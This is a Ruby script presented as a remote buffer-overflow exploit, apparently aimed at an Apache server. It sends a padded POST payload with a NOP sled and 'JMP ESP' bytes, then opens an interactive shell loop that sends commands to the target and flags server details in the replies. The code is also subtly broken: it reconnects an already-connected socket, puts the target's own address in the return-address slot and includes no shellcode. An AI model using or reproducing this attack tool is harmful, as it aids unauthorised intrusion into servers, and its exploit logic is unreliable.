require 'socket'
require 'ipaddr'
require 'os'
# Constants
APACHE_BANNER = "Apache/"
EIP_OFFSET = 62   

def custom_recv_until(s, delimiter)
  data = ""
  loop do
    chunk = s.recv(1)
    break unless chunk
    data += chunk
    break if data.include?(delimiter)
  end
  data
end

def send_payload(s, ip, port)
  # NOP sled
  nop_sled = "\x90" * 16

  # JMP ESP (ROP NOP)
  jmp_esp = "\xff\xe4"

  begin
    # Resolve the domain name to an IP address
    target_host = IPSocket.getaddress(ip)
    target_port = port.to_i

    # Set up the connection
    s.connect(Socket.pack_sockaddr_in(target_port, target_host))

    # Send the malicious HTTP request
    s.puts("POST / HTTP/1.1\r\n")
    s.puts("Host: #{ip}\r\n")
    s.puts("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n")
    s.puts("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
    s.puts("Connection: close\r\n")

    # Create the buffer overflow payload
    payload = "A" * EIP_OFFSET + [IPAddr.new(target_host).to_i].pack("N") + [target_port].pack("n") + nop_sled + jmp_esp

    # Send the payload
    s.puts("Content-Length: #{payload.bytesize}\r\n")
    s.puts("\r\n")
    s.write(payload)
  rescue Exception => e
    puts "Error occurred while sending payload: #{e}"
  end
end

def main
  print "Enter URL or IP: "
  ip = gets.chomp
  print "Enter port: "
  port = gets.chomp

  begin
    # Set up the socket
    s = TCPSocket.new(ip, port)

    # Send the payload
    send_payload(s, ip, port.to_i)

    # Interact with the shell
    loop do
      print "Shell> "
      command = gets.chomp
      break if command.downcase == "exit"

      # Send the command to the target
      s.puts("#{command}\n")

      # Receive the response
      response = custom_recv_until(s, "\n")
      print response.force_encoding('UTF-8')

      # If the response contains sensitive information, display it
      if response.include?("SERVER_ADMIN") || response.include?("SERVER_NAME")
        puts "[+] Sensitive information detected!"
        print response.force_encoding('UTF-8')
      end
    end

    # Close the socket
    s.close
  rescue Exception => e
    puts "Error occurred: #{e}"
  end
end

main
